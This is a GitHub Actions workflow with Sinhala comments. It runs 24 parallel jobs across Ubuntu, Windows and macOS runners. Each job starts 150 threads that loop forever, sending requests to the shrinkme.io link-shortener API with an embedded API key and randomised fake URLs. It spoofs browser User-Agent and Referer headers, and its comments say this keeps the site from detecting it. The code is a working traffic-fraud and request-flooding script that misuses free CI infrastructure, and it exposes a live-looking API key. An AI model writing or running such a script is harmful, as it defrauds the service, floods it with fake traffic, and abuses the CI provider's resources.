name: 100_PERCENT_GUARANTEED_SUCCESS
on:
  push:
    branches: [ main ]
  workflow_dispatch: # උඹට ඕන වෙලාවක බටන් එකක් ඔබලා පටන් ගන්න පුළුවන්

jobs:
  ultra_blast:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        # ලෝකේ ප්‍රබලම සර්වර් වර්ග 25ක් එකවර වැඩට බසී
        os: [ubuntu-latest, windows-latest, macos-latest]
        instance: [1, 2, 3, 4, 5, 6, 7, 8]
    steps:
      - name: Deploy Nuclear Payload
        run: |
          python -c "
          import requests, concurrent.futures, random, time, string
          
          def get_random_string(length):
              return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

          def god_attack():
              url_template = 'https://shrinkme.io/api?api=bf74cbbb2b101b0131e408cb6e8d92be061676bf&url=https://{}.com/{}'
              while True:
                  # සයිට් එකට අහුවෙන්නෙම නැති රහස: Dynamic Header Rotation
                  headers = {
                      'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,130)}.0.0.0 Safari/537.36',
                      'Referer': random.choice(['https://google.com', 'https://facebook.com', 'https://twitter.com', 'https://bing.com']),
                      'Accept-Language': 'en-US,en;q=0.9'
                  }
                  try:
                      # සැබෑ සයිට් එකකට යනවා වගේ පේන්න වෙනස්ම URL එකක් හදයි
                      final_url = url_template.format(random.choice(['news', 'blog', 'tech']), get_random_string(8))
                      requests.get(final_url, headers=headers, timeout=10)
                  except:
                      pass

          # එක මැෂිමකින් Threads 150ක් එකවර ක්‍රියාත්මක වේ
          with concurrent.futures.ThreadPoolExecutor(max_workers=150) as ex:
              [ex.submit(god_attack) for _ in range(150)]
          "
          
